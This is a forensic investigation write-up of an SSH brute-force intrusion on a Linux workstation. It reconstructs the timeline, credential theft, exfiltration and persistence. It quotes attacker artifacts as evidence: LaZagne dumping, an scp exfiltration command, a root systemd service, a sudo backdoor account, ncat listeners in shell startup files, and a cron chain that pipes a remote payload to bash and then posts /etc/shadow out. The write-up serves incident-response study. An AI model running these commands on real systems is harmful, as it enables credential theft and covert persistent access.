# Investigation Narrative

## 1. Case Context

A Linux workstation used by an IT manager showed missing, modified, and unfamiliar files. The available evidence consisted of:

- A captured root filesystem
- Live-response command output
- Login and authentication artifacts
- A filesystem bodyfile
- Precomputed executable hash inventories

The goal was to identify the access method, reconstruct the attacker's actions, determine what data left the host, identify malicious execution and persistence, and separate successful behavior from failed attempts.

## 2. Triage and the Rejected USB Hypothesis

The live-response package contained hardware, package, storage, network, process, and system data. Because USB information was present, removable media was considered as an initial-access hypothesis.

That hypothesis was not supported. The available inventory showed VMware virtual devices and Linux root hubs, but no evidence connecting a removable device to file transfer or execution.

**Decision:** Move from device inventory to authentication and login evidence.

## 3. SSH Credential Attack

`lastb` output contained repeated `ssh:notty` entries from `192.168.161.198`. The source attempted usernames including:

- `administrator`
- `admin`
- `default`
- `ubuntu`
- `root`

The pattern supports brute force or credential guessing over SSH. It does **not** prove password spraying because the evidence does not show that one password was reused across many accounts.

[View failed-login evidence](../assets/evidence/01-failed-ssh-attempts.png)

## 4. Establishing the First Successful Authentication

The first review of `last.txt` suggested that the attacker logged in at `19:41`. `last_-a_-F.txt` improved the precision to seconds, but it still represented session-accounting output rather than the earliest authentication event.

The investigation pivoted to `/var/log/auth.log`. That log contained:

```text
2025-02-10T19:39:03.232692+02:00 LuckyShot sshd[13105]:
Accepted password for administrator from 192.168.161.198 port 46160 ssh2
```

The corresponding session opened at `19:39:03.273657+02:00`.

**Conclusion:** The first confirmed successful authentication was `2025-02-10T19:39:03.232692+02:00`, not the later `19:41:10` session reported by login-accounting output.

[View accepted-password evidence](../assets/evidence/03-accepted-password-authlog.png)

## 5. Post-Compromise Activity

The `administrator` account's Bash history provided the clearest sequence of activity.

### 5.1 Discovery

The following commands checked account privileges, host identity, accounts, privileged group membership, services, processes, and user directories:

```bash
groups administrator
hostname
cut -d: -f1 /etc/passwd
getent group sudo
ps aux
systemctl list-units --type=service --state=running
ls -la /home/*
```

### 5.2 Credential Access and Tool Transfer

The attacker installed Git, cloned LaZagne, installed its dependencies, and ran:

```bash
python3 laZagne.py all
```

A second credential-recovery script, `mimipenguin.sh`, was downloaded and made executable. The surviving history does not show it being run, so execution should not be claimed from this artifact alone.

### 5.3 Exfiltration

The history recorded:

```bash
scp Passwords_Backup.txt Server_Credentials.txt kali@192.168.161.198:~/Desktop/
```

This ties the exfiltration destination to the same IP that generated the failed and successful SSH activity.

[View shell-history evidence](../assets/evidence/04-shell-history.png)

## 6. Malicious Script and Hash

The attacker changed to `/tmp`, made `sys_monitor.sh` executable, and launched it with `sudo`.

The script itself was no longer recovered at the expected `/tmp` execution path. The executable SHA-1 inventory mapped a file with the same name at a different path:

```text
3ae5dea716a4f7bfb18046bfba0553ea01021c75  /home/administrator/tmp/sys_monitor.sh
```

This is a strong association, but it is not a fresh hash calculated from the exact `/tmp/sys_monitor.sh` referenced by Bash history and the systemd unit. The path discrepancy should remain explicit.

[View SHA-1 evidence](../assets/evidence/05-script-sha1.png)

## 7. Persistence

### 7.1 Systemd Service

The file `/etc/systemd/system/systemd-networkm.service` used a deceptive name similar to legitimate Linux network-management services.

```ini
[Unit]
Description=System Network Management
After=network.target

[Service]
ExecStart=/bin/bash /tmp/sys_monitor.sh
Restart=always
User=root

[Install]
WantedBy=multi-user.target
```

The service executed the malicious script as root and was configured to restart. System logs showed the service starting at `20:11:20.692742+02:00`, deactivating, and entering a restart loop.

About one second after the first start, `auth.log` recorded the successful creation of `Regev`. Later service restarts aligned with repeated failed attempts to create the already-existing account. This timing strongly links the service/script execution to the persistence-account behavior, although the deleted script body was not recovered for direct verification.

[View service configuration](../assets/evidence/06-systemd-service.png)  
[View service-log correlation](../assets/evidence/07-systemd-service-logs.png)

### 7.2 SSH Authorized Key

`/root/.ssh/authorized_keys` contained a key with the comment `kali@kali`. Shell history separately showed data being copied to `kali@192.168.161.198`.

The matching string is a useful correlation clue. It should not be treated as attribution to a real person or system.

[View authorized-key evidence](../assets/evidence/08-authorized-key-identity.png)

### 7.3 Privileged Local Account

`auth.log` recorded:

```text
COMMAND=/usr/sbin/useradd -m -s /bin/bash -G sudo,adm Regev
```

The command was invoked at `2025-02-10T20:11:21.731285+02:00`. The successful `new user` event followed at:

```text
2025-02-10T20:11:21.783367+02:00
```

The account was added to both `adm` and `sudo`, providing privileged persistence.

[View account-creation evidence](../assets/evidence/10-local-user-creation.png)

### 7.4 Shell Startup Files

Root's shell initialization files contained two background Ncat listeners:

```bash
# /root/.bashrc
ncat -lvp 7575 &

# /root/.profile
ncat -lvp 9000 &
```

The `.bashrc` entry used the lowest port, `7575`. Because `.profile` also sources `.bashrc`, a root login shell could invoke both configured listeners. The files prove the persistence configuration; the available screenshot does not independently prove that either port successfully bound at runtime.

[View shell-startup evidence](../assets/evidence/09-shell-startup-listeners.png)

## 8. Scheduled Payload: Artifact Present, Execution Failed

`/etc/cron.d/syscheck` contained a command intended to:

1. Check for `curl`
2. Install it if unavailable
3. Fetch content from a Pastebin raw URL
4. Reverse the fetched text
5. Base64-decode it
6. Pipe it to Bash

The schedule began with `/1` instead of valid cron syntax. Syslog recorded:

```text
Error: bad minute; while reading /etc/cron.d/syscheck
ERROR (Syntax error, this crontab file will be ignored)
```

**Conclusion:** The persistence artifact existed, but the scheduled execution mechanism was ineffective.

[View cron artifact](../assets/evidence/11-cron-payload-fetch.png)  
[View cron failure](../assets/evidence/12-cron-syntax-failure.png)

## 9. Decoded Payload

The remote content was decoded for static inspection without piping it to Bash. The recovered commands Base64-encoded `/etc/shadow` and `/etc/passwd` and attempted to send each result through an HTTP POST to:

```text
http://192.168.161.198/steal.php
```

This demonstrates the payload's intended credential collection and exfiltration behavior. Because cron rejected the schedule, the cron evidence alone does not prove that this payload executed through that mechanism.

[View decoded payload](../assets/evidence/13-decoded-payload.png)

## 10. Final Assessment

The evidence supports an SSH credential attack followed by interactive post-compromise activity, credential access, data exfiltration, malicious script execution, and several persistence mechanisms.

Two analytical corrections materially improved the result:

1. USB presence was rejected as an access theory when the device evidence did not support it.
2. The first-login time was revised from session-accounting output to the earlier accepted-password event in `auth.log`.

A third distinction prevented overstatement: the malicious cron file was present, but system logs proved that cron ignored it.
